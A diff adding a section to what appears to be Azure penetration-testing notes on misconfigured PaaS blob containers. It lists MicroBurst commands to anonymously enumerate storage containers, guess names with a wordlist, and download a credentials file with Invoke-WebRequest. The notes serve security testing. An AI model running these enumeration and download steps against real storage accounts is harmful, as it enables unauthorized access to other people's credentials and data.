@@ -22,3 +22,18 @@ These vulnerabilities are not limited to the parameters that are managed in Azur
 An administrator could misconfigure a service on a VM, expose it to the internet, and
 create a vulnerability.
 
+### 2) PaaS configutation-related vulnerabilities
+
+## Example:
+
+#### Misconfigured blob containers:
+
+ - Import-Module MicroBurst.psm1
+
+ - Invoke-EnumerateAzureBlobs -Base BASE_NAME (Anonymously enumerate storage account containers)
+
+ - Invoke-WebRequest -Uri "https://azurepentesting.blob.core.windows.net/private/credentials.txt" -OutFile "credentials.txt" (Extract enumerated container found with MicroBurst)
+
+## To use custom permutation wordlist we use the command:
+
+ - Invoke-EnumerateAzurebLOBS -Base BASE_NAME -Folders .\CUSTOM_CONTAINER_WORDLIST.TXT
